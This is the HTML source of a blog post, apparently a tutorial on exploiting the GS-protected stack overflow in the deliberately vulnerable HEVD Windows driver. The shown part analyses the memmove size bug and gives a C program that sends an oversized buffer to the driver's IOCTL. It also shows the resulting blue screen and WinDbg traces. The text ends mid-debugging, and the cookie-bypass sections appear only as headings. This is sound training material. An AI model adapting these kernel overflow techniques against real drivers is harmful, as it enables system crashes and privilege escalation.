+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#source-analysis">Source Analysis
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#first-contact">First contact
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#debugging-bsod-0xf7">Debugging BSOD (0xf7)
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#x32-bypass-exp-301-content">x32 Bypass (EXP-301 Content)
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#bypassing-gsstack-cookie">Bypassing GS/Stack Cookie
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#exploiting-arbitraryread-for-leak">Exploiting ArbitraryRead for leak
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#leaking-rsp">Leaking RSP
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#stacklimit">StackLimit
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#stack-search">Stack Search
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#rsp-offset-from-stacklimit">RSP offset from StackLimit
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#calculating-registers-offsets">Calculating registers offsets
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#conclusion">Conclusion
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#resources">Resources
+        </a>
+      </li></ul>
+      <div class="hx-mt-8 hx-border-t hx-bg-white hx-pt-8 hx-shadow-[0_-12px_16px_white] dark:hx-bg-dark dark:hx-shadow-[0_-12px_16px_#111] hx-sticky hx-bottom-0 hx-flex hx-flex-col hx-items-start hx-gap-2 hx-pb-8 dark:hx-border-neutral-800 contrast-more:hx-border-t contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx-transition-all hx-duration-75 hx-opacity-0 hx-text-xs hx-font-medium hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-100 contrast-more:hx-text-gray-800 contrast-more:dark:hx-text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx-inline ltr:hx-ml-1 rtl:hx-mr-1 hx-h-3.5 hx-w-3.5 hx-border hx-rounded-full hx-border-gray-500 hover:hx-border-gray-900 dark:hx-border-gray-400 dark:hover:hx-border-gray-100 contrast-more:hx-border-gray-800 contrast-more:dark:hx-border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx-w-full hx-break-words hx-flex hx-min-h-[calc(100vh-var(--navbar-height))] hx-min-w-0 hx-justify-center hx-pb-8 hx-pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx-w-full hx-min-w-0 hx-max-w-6xl hx-px-6 hx-pt-4 md:hx-px-12">
+        
+  <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/winint-compilation/">WinInt Compilation</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">StackOverflow GS x64</div>
+  </div>
+
+        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">StackOverflow GS x64</h1>
+        <div class="hx-mt-4 hx-mb-16 hx-text-gray-500 hx-text-sm hx-flex hx-items-center hx-flex-wrap hx-gap-y-2"></div>
+        <div class="content">
+          <h2>Introduction<span class="hx-absolute -hx-mt-20" id="introduction"></span>
+    <a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>After spending some time working on kernel exploits, I’m going to take a short break to dive into Windows attacks and some “red team” activities. To wrap up these three exploits in the HEVD driver, I’d like to show you some stack overflows, so you’ve seen exploits targeting buffers, unprotected stacks, and protected stacks.</p>
+<p>I want to apologize before I begin: it took me a few months to write this post due to college exams, so enjoy the blog, and, God willing, the next post will be an investigation into Windows or a zero-day kernel exploit; in other words, there will be no more public documentation on HEVD exploitation on this blog :D</p>
+<h3>Environment<span class="hx-absolute -hx-mt-20" id="environment"></span>
+    <a href="#environment" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>To be honest, I won&rsquo;t explain this, if you want to know more information please check any other HEVD explotation, I have the same OS and setup.</p>
+<p>I only share the main source to understand structures: <a href="https://www.vergiliusproject.com/kernels/x64/windows-10/1809/" target="_blank" rel="noopener">https://www.vergiliusproject.com/kernels/x64/windows-10/1809/</a></p>
+<h2>Source Analysis<span class="hx-absolute -hx-mt-20" id="source-analysis"></span>
+    <a href="#source-analysis" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Compared to other functions, stackoverflow isn&rsquo;t hard to understand at all. It&rsquo;s just two functions with a few lines of code, which is pretty interesting at first glance, haha</p>
+<p><img src="image.png" alt="" loading="lazy" /></p>
+<p>Knowing the calling convention <code>__fastcall</code>, we know that the argument list from left to right are passed in ECX and EDXX registers, all other arguments are passed on the stack from right to left. In other words:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>RCX -&gt; UserBuffer
+EDX -&gt; Size</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<blockquote>
+  <p>If you want to learn more about __fastcall calling convention: <a href="https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170</a></p>
+
+</blockquote>
+<p>Furthermore, triggering the BOF only requires overwriting 512 (0x200) bytes of data. This vulnerability exists because <code>memmove(KernelBuffer, UserBuffer, Size);</code> trusts the user-supplied Size parameter instead of validating it against <code>sizeof(KernelBuffer)</code>.</p>
+<p>Since we are dealing with kernel drivers that have modern protections enabled, we will run into issues with the <code>StackCookie</code>, which is designed to detect stack buffer overflows and prevent control-flow hijacking.</p>
+<p><img src="image-1.png" alt="" loading="lazy" /></p>
+<p>But, this we will get in detail in a few moments, first of all we want to get the BSOD related with the Canary Cookie.</p>
+<h2>First contact<span class="hx-absolute -hx-mt-20" id="first-contact"></span>
+    <a href="#first-contact" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Once we understand how the driver works, lets try to call the IOCTL to see how it works. Just a reminder that to view kernel debug messages outside of Windbg, you can use the DebugView tool from Sysinternals.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">FILE_SHARE_READ</span><span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buff</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Sending A&#39;s buffer with a size of: 0x%zx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="image-2.png" alt="" loading="lazy" /></p>
+<p>As we can see, we have contorl of the RCX register, if we increase its size, it causes a blue screen:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">DRIVER_OVERRAN_STACK_BUFFER</span> <span class="p">(</span><span class="n">f7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="n">driver</span> <span class="n">has</span> <span class="n">overrun</span> <span class="n">a</span> <span class="n">stack</span><span class="o">-</span><span class="n">based</span> <span class="n">buffer</span><span class="p">.</span>  <span class="n">This</span> <span class="n">overrun</span> <span class="n">could</span> <span class="n">potentially</span>
+</span></span><span class="line"><span class="cl"><span class="n">allow</span> <span class="n">a</span> <span class="n">malicious</span> <span class="n">user</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">control</span> <span class="n">of</span> <span class="n">this</span> <span class="n">machine</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">DESCRIPTION</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="n">driver</span> <span class="n">overran</span> <span class="n">a</span> <span class="n">stack</span><span class="o">-</span><span class="n">based</span> <span class="nf">buffer</span> <span class="p">(</span><span class="n">or</span> <span class="n">local</span> <span class="n">variable</span><span class="p">)</span> <span class="n">in</span> <span class="n">a</span> <span class="n">way</span> <span class="n">that</span> <span class="n">would</span>
+</span></span><span class="line"><span class="cl"><span class="n">have</span> <span class="n">overwritten</span> <span class="n">the</span> <span class="n">function</span><span class="err">&#39;</span><span class="n">s</span> <span class="k">return</span> <span class="n">address</span> <span class="n">and</span> <span class="n">jumped</span> <span class="n">back</span> <span class="n">to</span> <span class="n">an</span> <span class="n">arbitrary</span>
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="n">when</span> <span class="n">the</span> <span class="n">function</span> <span class="n">returned</span><span class="p">.</span>  <span class="n">This</span> <span class="n">is</span> <span class="n">the</span> <span class="n">classic</span> <span class="s">&#34;buffer overrun&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">hacking</span> <span class="n">attack</span> <span class="n">and</span> <span class="n">the</span> <span class="n">system</span> <span class="n">has</span> <span class="n">been</span> <span class="n">brought</span> <span class="n">down</span> <span class="n">to</span> <span class="n">prevent</span> <span class="n">a</span> <span class="n">malicious</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">gaining</span> <span class="n">complete</span> <span class="n">control</span> <span class="n">of</span> <span class="n">it</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Do</span> <span class="n">a</span> <span class="n">kb</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">stack</span> <span class="n">backtrace</span> <span class="o">--</span> <span class="n">the</span> <span class="n">last</span> <span class="n">routine</span> <span class="n">on</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">before</span> <span class="n">the</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="n">overrun</span> <span class="n">handlers</span> <span class="n">and</span> <span class="n">BugCheck</span> <span class="n">call</span> <span class="n">is</span> <span class="n">the</span> <span class="n">one</span> <span class="n">that</span> <span class="n">overran</span> <span class="n">its</span> <span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="nf">variable</span><span class="p">(</span><span class="n">s</span><span class="p">).</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Arguments</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Arg1</span><span class="p">:</span> <span class="n">bcbce548c2f26772</span><span class="p">,</span> <span class="n">Actual</span> <span class="n">security</span> <span class="n">check</span> <span class="n">cookie</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Arg2</span><span class="p">:</span> <span class="mf">000031f2602f</span><span class="mi">5419</span><span class="p">,</span> <span class="n">Expected</span> <span class="n">security</span> <span class="n">check</span> <span class="n">cookie</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Arg3</span><span class="p">:</span> <span class="n">ffffce0d9fd0abe6</span><span class="p">,</span> <span class="n">Complement</span> <span class="n">of</span> <span class="n">the</span> <span class="n">expected</span> <span class="n">security</span> <span class="n">check</span> <span class="n">cookie</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Arg4</span><span class="p">:</span> <span class="mo">0000000000000000</span><span class="p">,</span> <span class="n">zero</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>But, why?</p>
+<h3>Debugging BSOD (0xf7)<span class="hx-absolute -hx-mt-20" id="debugging-bsod-0xf7"></span>
+    <a href="#debugging-bsod-0xf7" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Setting a breakpoint on: <code>HEVD!BufferOverflowStackGSIoctlHandler</code>, we can understand that the Irp that we saw before is the <code>rcx</code> we assume:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mi">61</span><span class="n">de66c4</span> <span class="mi">488</span><span class="n">b4a20</span>         <span class="n">mov</span>     <span class="nf">Irp</span> <span class="p">(</span><span class="n">rcx</span><span class="p">),</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">IrpSp</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">{.</span><span class="n">CreatePipe</span><span class="p">.</span><span class="n">Parameters</span><span class="p">}</span> <span class="p">(</span><span class="n">rdx</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">)]</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>If we continue the control flow and reading the rcx value, we will see all of ours A&rsquo;s:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">5</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
+</span></span><span class="line"><span class="cl"><span class="n">HEVD</span><span class="o">!</span><span class="n">BufferOverflowStackGSIoctlHandler</span><span class="o">+</span><span class="mh">0x4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mi">61</span><span class="n">de66c4</span> <span class="mi">488</span><span class="n">b4a20</span>        <span class="n">mov</span>     <span class="n">rcx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">dq</span> <span class="n">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f3b0</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f3c0</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f3d0</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f3e0</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f3f0</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f400</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f410</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl"><span class="mo">000000</span><span class="n">b3</span><span class="err">`</span><span class="n">fe98f420</span>  <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span> <span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Continuing with the reversing we can found the allocation of the KernelBuffer struct:</p>
+<p><img src="image-3.png" alt="" loading="lazy" /></p>
+<p>After the <code>DbgPrintEx</code> functions we found ONLY in the assembly the <code>_security_check_cookie</code> function the cause of the blue screen.</p>
+<p>I have done a comparation of Windbg assembly with the pseuco-C and assembly from IDA Pro 9.0, so you can also have the same mindset of the driver as mine:</p>
+<p><img src="image-4.png" alt="" loading="lazy" /></p>
+<p>Here&rsquo;s a quick color guide to help you understand, it might seem confusing at first, but don&rsquo;t worry:</p>
+<ul>
+<li>Red: Junk code, <code>DbgPrintEx</code> instructions</li>
+<li>Green: <code>memcpy</code> arguments list</li>
+<li>Brown: <code>__security_check_cookie</code> instructions</li>
+</ul>
